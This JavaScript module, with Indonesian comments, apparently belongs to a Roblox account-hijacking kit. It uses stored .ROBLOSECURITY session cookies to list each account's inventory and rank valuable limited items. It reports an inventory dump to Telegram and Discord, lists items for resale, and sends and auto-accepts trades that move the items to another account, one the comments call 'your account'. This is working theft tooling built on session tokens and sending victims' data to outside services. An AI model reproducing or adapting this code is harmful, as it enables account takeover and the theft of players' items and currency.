// inventory.js
// dump inventory, deteksi limited item, auto-trade ke akun kamu
import axios from 'axios';
import 'dotenv/config';
import { getCookie } from './session.js';
import { notify } from './telegram.js';
import { sendDiscord } from './discord.js';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';

function client(cookie) {
  return axios.create({
    headers: {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': UA,
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com',
      'Content-Type': 'application/json'
    },
    validateStatus: () => true
  });
}

async function getCsrf(c) {
  const r = await c.post('https://auth.roblox.com/v1/logout');
  return r.headers['x-csrf-token'];
}

// --- get userId from cookie ---
async function getUserId(cookie) {
  const r = await axios.get('https://users.roblox.com/v1/users/authenticated', {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    validateStatus: () => true
  });
  return r.data?.id;
}

// --- fetch full inventory (paginated) ---
export async function fetchInventory(username, { assetTypes = [], limit = 100 } = {}) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };

  const userId = await getUserId(cookie);
  if (!userId) return { ok: false, error: 'cookie invalid' };

  const all = [];
  let cursor = '';
  const assetTypeQuery = assetTypes.length ? `&assetTypes=${assetTypes.join(',')}` : '';

  for (let page = 0; page < 50; page++) {
    const url = `https://inventory.roblox.com/v2/users/${userId}/inventory?limit=${limit}&cursor=${encodeURIComponent(cursor)}${assetTypeQuery}`;
    const r = await axios.get(url, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'User-Agent': UA },
      validateStatus: () => true
    });
    if (r.status !== 200) break;
    all.push(...(r.data.data || []));
    cursor = r.data.nextPageCursor;
    if (!cursor) break;
    await new Promise(res => setTimeout(res, 200));
  }

  return { ok: true, userId, items: all, count: all.length };
}

// --- classify items by rarity via collectible API ---
export async function classifyLimited(items) {
  const limited = [];
  const chunkSize = 20;

  for (let i = 0; i < items.length; i += chunkSize) {
    const chunk = items.slice(i, i + chunkSize);
    const ids = chunk.map(x => x.assetId || x.id).filter(Boolean).join(',');
    if (!ids) continue;

    const r = await axios.get(`https://economy.roblox.com/v2/assets/${ids}/details`, {
      validateStatus: () => true
    });
    if (r.status !== 200) continue;

    for (const id of Object.keys(r.data || {})) {
      const d = r.data[id];
      if (d?.IsLimited || d?.IsLimitedUnique || d?.CollectibleItemId) {
        limited.push({
          assetId: Number(id),
          name: d.Name,
          isLimited: d.IsLimited,
          isLimitedUnique: d.IsLimitedUnique,
          recentAveragePrice: d.RecentAveragePrice,
          originalPrice: d.OriginalPrice,
          lowestResalePrice: d.LowestResalePrice,
          remaining: d.Remaining
        });
      }
    }
    await new Promise(res => setTimeout(res, 300));
  }

  limited.sort((a, b) => (b.recentAveragePrice || 0) - (a.recentAveragePrice || 0));
  return limited;
}

// --- dump full report ---
export async function dumpInventory(username) {
  const r = await fetchInventory(username);
  if (!r.ok) return r;

  const limited = await classifyLimited(r.items);
  const totalValue = limited.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);

  const report = {
    username,
    userId: r.userId,
    totalItems: r.count,
    limitedCount: limited.length,
    totalRAP: totalValue,
    limited: limited.slice(0, 100) // top 100
  };

  const msg = `📦 *Inventory Dump — \`${username}\`*\n\n` +
    `🆔 userId: \`${r.userId}\`\n` +
    `📊 total items: ${r.count}\n` +
    `💎 limited: ${limited.length}\n` +
    `💰 total RAP: R$ ${totalValue.toLocaleString()}\n\n` +
    `*Top 10 limited:*\n` +
    limited.slice(0, 10).map(i => `• ${i.name} — R$ ${(i.recentAveragePrice || 0).toLocaleString()}`).join('\n');

  await notify(msg);
  await sendDiscord(msg);

  return { ok: true, ...report };
}

// --- sell limited item for robux ---
export async function sellLimited(username, assetId, price, userId) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };
  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // step 1: get collectible item instance id
  const r1 = await c.get(`https://inventory.roblox.com/v1/users/${userId || (await getUserId(cookie))}/items/Asset/${assetId}/is-owned`);
  if (!r1.data) return { ok: false, error: 'not owned' };

  // step 2: create resale listing
  const r2 = await c.post(`https://economy.roblox.com/v1/assets/${assetId}/resell`, {
    userAssetId: r1.data?.userAssetId,
    price
  });

  return { ok: r2.status === 200, data: r2.data };
}

// --- trade limited ke akun kamu ---
// roblox trade API: send trade, accept trade (butuh 2 akun + trade token)
export async function sendTrade(senderUsername, receiverUsername, offerAssetIds, requestAssetIds = []) {
  const senderCookie = getCookie(senderUsername);
  const receiverCookie = getCookie(receiverUsername);
  if (!senderCookie || !receiverCookie) return { ok: false, error: 'missing cookie for one of accounts' };

  const senderId = await getUserId(senderCookie);
  const receiverId = await getUserId(receiverCookie);

  const cs = client(senderCookie);
  const csrf = await getCsrf(cs);
  cs.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // step 1: get trade token
  const rt = await cs.post(`https://trades.roblox.com/v1/trades/send`, {
    offerUserId: receiverId,
    offerUserAssets: offerAssetIds.map(id => ({ assetId: id, userAssetIds: [] })),
    requestUserAssets: requestAssetIds.map(id => ({ assetId: id, userAssetIds: [] }))
  });
  return { ok: rt.status === 200, data: rt.data };
}

// --- accept trade (pake receiver cookie) ---
export async function acceptTrade(receiverUsername, tradeId) {
  const cookie = getCookie(receiverUsername);
  if (!cookie) return { ok: false, error: 'no cookie' };
  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  const r = await c.post(`https://trades.roblox.com/v1/trades/${tradeId}/accept`, {});
  return { ok: r.status === 200, data: r.data };
}

// --- auto trade flow (send + accept dalam satu call) ---
export async function autoTrade(senderUsername, receiverUsername, offerAssetIds) {
  const send = await sendTrade(senderUsername, receiverUsername, offerAssetIds);
  if (!send.ok) return send;

  const tradeId = send.data?.id;
  if (!tradeId) return { ok: false, error: 'no tradeId returned' };

  await new Promise(r => setTimeout(r, 3000));
  const accept = await acceptTrade(receiverUsername, tradeId);

  await notify(`🔁 Trade ${offerAssetIds.length} items: \`${senderUsername}\` → \`${receiverUsername}\` — ${accept.ok ? '✅' : '❌'}`);
  return { ok: accept.ok, tradeId, accept };
}
